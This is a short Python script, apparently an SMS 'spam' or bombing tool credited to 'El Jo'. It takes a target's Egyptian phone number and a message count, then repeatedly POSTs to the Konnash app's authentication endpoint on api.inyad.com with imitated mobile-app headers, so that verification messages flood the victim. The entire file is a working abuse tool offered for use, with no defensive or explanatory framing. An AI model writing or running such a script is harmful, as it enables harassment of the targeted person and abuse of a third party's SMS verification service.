import requests
import pyfiglet
import hashlib, random


red_color = '\033[1;31m'
yellow_color = '\033[1;33m'
green_color = '\033[2;32m'
white_color = '\033[1;97m'
blue_color = '\033[1;34m'
light_blue_color = '\033[2;36m'
light_green_color = '\033[1;32m'
light_yellow_color = '\033[1;33m'

ascii_art = pyfiglet.figlet_format(" El Jo Net")
j = pyfiglet.figlet_format(" Spam")
print(green_color + ascii_art)
print(j)
import webbrowser
#webbrowser.open('https://t.me/medofreeNet')
print(light_blue_color + "by code: El Jo ")
print(blue_color + "By code: Yousef Jo")
print("")
nu = input(green_color + "Enter a number : " + light_blue_color)
print("")
nu2 =''
print("")
#nu3 = input(green_color + "Enter a number 2 : " + light_blue_color)
#print("")

m = int(input(green_color + "Enter a Number of messages  : " + light_blue_color))

for _ in range(m):
    url3 = 'https://api.inyad.com/accounts/konnash/mobile/create-authentication'

    headers3 = {
        'authentication': 'h2',
        'Host': 'api.inyad.com',
        'konnash-api-version': '1021201',
        'content-type': 'application/json; charset=UTF-8',
        'content-length': '150',
        'accept-encoding': 'gzip',
        'user-agent': 'okhttp/4.8.0'
    }

    data3 = '{"header":{"language":"ar","request_id":"4f18e521-c47d-4cd9-86af-8ea4eaa41ce9","timestamp":1704361926043},"payload":{"phone_number":"+20%s"}}' % (nu)

    r3 = requests.post(url3, headers=headers3, data=data3).text
    url33 = 'https://api.inyad.com/accounts/konnash/mobile/create-authentication'

    headers33 = {
        'authentication': 'h2',
        'Host': 'api.inyad.com',
        'konnash-api-version': '1021201',
        'content-type': 'application/json; charset=UTF-8',
        'content-length': '150',
        'accept-encoding': 'gzip',
        'user-agent': 'okhttp/4.8.0'
    }

    data33 = '{"header":{"language":"ar","request_id":"4f18e521-c47d-4cd9-86af-8ea4eaa41ce9","timestamp":1704361926043},"payload":{"phone_number":"+20%s"}}' % (nu2)

    r33 = requests.post(url33, headers=headers33, data=data33).text
    print("--------------» Dane send ✅ ")
